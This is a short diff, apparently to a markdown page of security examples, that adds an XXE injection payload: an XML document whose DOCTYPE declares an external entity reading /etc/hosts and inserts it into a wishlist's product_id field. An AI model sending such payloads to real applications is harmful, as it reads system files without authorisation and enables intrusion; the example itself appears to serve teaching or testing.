@@ -9,3 +9,14 @@
 <phone>111000</phone>
 </people>
 ```
+
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+</wishlist>
+```
